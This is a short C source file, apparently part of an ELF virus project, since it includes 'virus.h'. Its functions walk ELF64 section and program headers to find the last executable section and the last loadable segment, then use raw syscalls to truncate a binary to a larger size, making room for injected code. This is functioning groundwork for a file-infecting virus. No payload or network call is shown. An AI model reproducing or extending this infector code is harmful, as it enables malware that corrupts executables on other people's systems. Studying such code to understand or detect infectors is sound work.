#include "virus.h"

void    findLastExecSection(struct sheaders64 *sHdrs, struct ELFheaders64 fHdr, int *last_sHdr_exec) {
    int i = 0;

    while (i < fHdr.e_shnum) {
        if (sHdrs[i].sh_flags & SHF_EXECINSTR)
            *last_sHdr_exec = i;
        i++;
    }
}

int    findLastLoadSection(struct sheaders64 *sHdrs, struct ELFheaders64 fHdr, struct pheaders64 pHdr) {
    int i = 0;
    unsigned char check = 0;

    while (i < fHdr.e_shnum) {
        if (sHdrs[i].sh_addr >= pHdr.p_paddr && sHdrs[i].sh_addr <= pHdr.p_paddr + pHdr.p_memsz)
            check = 1;
        else
            if (check == 1)
                return (i - 1);
        i++;
    }
}

int get_last_load_segment(struct pheaders64 *pHdrs, struct ELFheaders64 fHdr) {

	for (int i = 1; i < fHdr.e_phnum; i++)
	{
		if (pHdrs[i].p_type != PT_LOAD && pHdrs[i - 1].p_type == PT_LOAD)
			return (i - 1);
	}
	return (-1);
}

unsigned char increaseFileSize(int fd, struct ELFheaders64 fHdr, struct sheaders64 *sHdrs) {
    struct stat buf;
    int bss_index;

    bss_index = get_section_index(SHF_WRITE + SHF_ALLOC, SHT_NOBITS, fHdr, sHdrs);
    if ((int)ft_syscall((void *)fd, (void *)&buf, 0, 0, FSTAT) < 0)
        return (1);
    if((int)ft_syscall((void *)fd, (void *)(buf.st_size + 0x1000 + sHdrs[bss_index].sh_size), 0, 0, FTRUNCATE) < 0)
        return (1);
    return (0);
}